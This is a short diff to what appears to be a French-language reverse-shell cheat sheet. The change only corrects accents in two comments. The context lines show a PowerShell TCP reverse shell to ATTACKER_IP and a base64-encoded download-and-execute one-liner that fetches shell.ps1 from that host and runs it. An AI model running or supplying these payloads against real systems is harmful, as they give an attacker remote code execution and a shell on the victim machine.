@@ -67,9 +67,9 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_
 
 ### PowerShell (base64)
 ```bash
-# Generer le payload encode
+# Générer le payload encodé
 echo -n 'IEX(New-Object Net.WebClient).downloadString("http://ATTACKER_IP/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
-# Executer
+# Exécuter
 powershell -enc <BASE64>
 ```
 
